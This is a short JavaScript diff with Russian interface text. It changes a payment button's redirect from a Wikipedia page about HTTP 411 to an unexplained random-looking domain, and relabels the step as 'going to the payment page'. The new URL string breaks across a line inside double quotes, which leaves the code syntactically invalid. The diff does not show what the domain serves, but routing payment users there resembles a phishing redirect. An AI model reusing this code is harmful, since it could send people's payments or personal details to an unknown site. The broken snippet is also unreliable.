@@ -19,13 +19,14 @@ document.addEventListener('DOMContentLoaded', function() {
                     <i class="fas fa-spinner fa-spin"></i>
                     <span>ПЕРЕНАПРАВЛЕНИЕ...</span>
                 </div>
-                <div class="tg-btn-sub">идёт переход на Википедию</div>
+                <div class="tg-btn-sub">идёт переход на страницу оплаты</div>
             `;
             paymentBtn.disabled = true;
             
             // Перенаправляем через небольшую задержку
             setTimeout(() => {
-                window.location.href = "https://ru.wikipedia.org/wiki/HTTP_411";
+                window.location.href = "https://ytey3yw3gws.org
+                ";
                 // Альтернатива: window.open("https://ru.wikipedia.org/wiki/HTTP_411", "_blank");
             }, 500);
         });
